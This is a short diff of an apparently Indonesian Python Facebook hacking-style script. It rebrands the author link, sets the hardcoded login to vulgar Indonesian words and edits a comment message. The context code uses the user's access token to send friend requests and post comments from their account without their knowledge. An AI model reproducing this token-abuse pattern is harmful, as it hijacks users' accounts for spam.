@@ -58,7 +58,7 @@ logo = """
 \033[0;93m╔════════════════════════════════════════════╗
 \033[0;93m \033[0;96m{*} \033[0;93mAuthor  \033[0;93m : \033[0;93mPahrul \033[0;93m                 
 \033[0;93m \033[0;96m{*} \033[0;93mFacebook \033[0;93m: \033[0;93mPahrul \033[0;93m                
-\033[0;93m \033[0;96m{*} \033[0;93mGithub \033[0;93m: \033[0;93mhttps://github.com/pahrul404 \033[0;93m                
+\033[0;93m \033[0;96m{*} \033[0;93mGithub \033[0;93m: \033[0;93mhttps://github.com/Rezahasyim \033[0;93m                
 \033[0;93m╚════════════════════════════════════════════╝"""
 
 def tik():
@@ -82,8 +82,8 @@ print 40* "\033[0;39m─"
                                                                                 
 print 40* "\033[0;39m─"
 
-CorrectUsername = "pahrul"
-CorrectPassword = "pahrul"
+CorrectUsername = "kontol"
+CorrectPassword = "memek"
 
 loop = 'true'
 while (loop == 'true'):
@@ -130,7 +130,7 @@ def bot_komen():
     reac = 'ANGRY'
     post = '946670209494313'
     post2 = '946670209494313'
-    kom2 = 'Saat nya nge hack muehehe😂'
+    kom2 = 'Saat nya ngoclok😂'
     reac2 = 'LOVE'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
